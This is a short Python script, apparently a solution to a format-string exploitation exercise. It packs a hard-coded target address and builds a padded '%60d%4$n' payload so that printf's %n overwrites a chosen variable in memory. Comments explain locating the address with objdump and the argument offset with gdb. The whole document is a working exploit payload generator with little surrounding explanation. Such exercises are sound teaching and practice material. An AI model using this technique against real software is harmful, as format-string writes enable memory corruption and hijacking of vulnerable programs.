import struct

# pad will give you a constant length string so that stack does not vary accroding to input
def pad(string, length):
        return (string[:length] + "." * (length - len(string)))

# address of the target variable
# can be found using objdump
addr = struct.pack("I", 0x080496e4)

# padding is such that %n lands on the address above as its parameters
# 4$ means it will apply to the fourth parameter
# find at which position is your address in parameter list using gdb
padding = pad("%60d" + "%4$n", 512)

print(addr + padding)
